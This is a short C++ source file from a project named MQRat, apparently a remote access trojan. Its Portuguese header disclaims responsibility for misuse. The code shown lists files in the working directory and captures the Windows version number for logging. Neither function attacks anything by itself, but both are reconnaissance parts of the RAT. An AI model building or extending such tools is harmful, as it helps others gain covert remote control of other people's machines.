/*
	This file is part of MQRat.
	
	Copyright (C) 2019  MQRat Project

	O autor não se responsabiliza por variantes (ou sources originais) deste software 
	que estejam sendo utilizadas para prejudicar terceiros.
*/

#include <iostream>
#include <filesystem>
#include "api.hpp"
#include "fs.hpp"
#include "log.hpp"

using namespace std;

vector<string> API::FileSystem::ListFiles()
{
    vector<string> file_list;
    string path = ".";

    for(auto entry : filesystem::directory_iterator(path)) {
        auto filename = entry.path().filename().generic_string();
        file_list.push_back(filename);
    }

    return file_list;
}

std::string API::FileSystem::GetWindowsVersion()
{
    OSVERSIONINFOA version;
    char szVersion[BUFSIZ];

    RtlSecureZeroMemory(&version, sizeof(OSVERSIONINFO));
    version.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);

    if(GetVersionExA(&version)) {
        
        // Build string with version information
        snprintf(szVersion, 
                BUFSIZ, 
                "%u.%u.%u", version.dwMajorVersion,
                version.dwMinorVersion,
                version.dwBuildNumber
        );

        Log::LogInfo("Captured version: %s", szVersion);

        return string(szVersion);
    }

    return "failed";
}
